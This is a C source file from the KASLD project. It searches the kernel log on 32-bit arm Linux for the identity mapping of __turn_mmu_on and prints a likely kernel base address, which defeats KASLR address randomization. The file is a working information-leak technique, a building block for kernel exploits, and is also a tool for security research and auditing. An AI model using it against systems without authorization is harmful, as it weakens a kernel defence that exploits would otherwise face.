// This file is part of KASLD - https://github.com/bcoles/kasld
//
// Search kernel log for identity mappings created during kernel init.
//
// On arm systems with CONFIG_MMU=y, an identity mapping is created for
// the `__turn_mmu_on` function when enabling the MMU during kernel init.
//
// On 32-bit arm systems, the `identity_mapping_add()` function prints
// mappings to the kernel log.
//
// Requires:
// - CONFIG_MMU=y
// - kernel.dmesg_restrict = 0; or CAP_SYSLOG capabilities; or
//   readable /var/log/dmesg.
//
// References:
// https://elixir.bootlin.com/linux/v5.15.11/source/arch/arm/mm/idmap.c#L89
// https://elixir.bootlin.com/linux/v5.15.11/source/arch/arm/kernel/head.S#L237
// https://github.com/torvalds/linux/commit/8903826d0cd99aed9267e792d38284cf3092042b
// https://github.com/torvalds/linux/commit/2c8951ab0c337cb198236df07ad55f9dd4892c26
// https://github.com/torvalds/linux/commit/4e8ee7de227e3ab9a72040b448ad728c5428a042
// ---
// <bcoles@gmail.com>

#define _GNU_SOURCE
#include "include/dmesg.h"
#include "include/kasld.h"
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

static int on_match(const char *line, void *ctx) {
  unsigned long *result = ctx;
  char *endptr;
  char buf[BUFSIZ];
  char *ptr;

  /* Make a mutable copy for strtok */
  strncpy(buf, line, sizeof(buf) - 1);
  buf[sizeof(buf) - 1] = '\0';

  /* Scan words for a hex value in kernel range */
  ptr = strtok(buf, " ");
  while ((ptr = strtok(NULL, " ")) != NULL) {
    unsigned long addr = strtoul(ptr, &endptr, 16);

    if (addr >= KERNEL_BASE_MIN && addr <= KERNEL_BASE_MAX) {
      *result = addr;
      return 0;
    }
  }

  return 1;
}

int main(void) {
  unsigned long addr = 0;

  printf("[.] searching dmesg for ' static identity map for ' ...\n");
  dmesg_search(" static identity map for ", on_match, &addr);

  if (!addr)
    return 1;

  printf("leaked __turn_mmu_on: %lx\n", addr);
  printf("possible kernel base: %lx\n", addr & -KERNEL_ALIGN);
  kasld_result(KASLD_ADDR_VIRT, KASLD_SECTION_TEXT, addr, "dmesg_mmu_idmap");

  return 0;
}
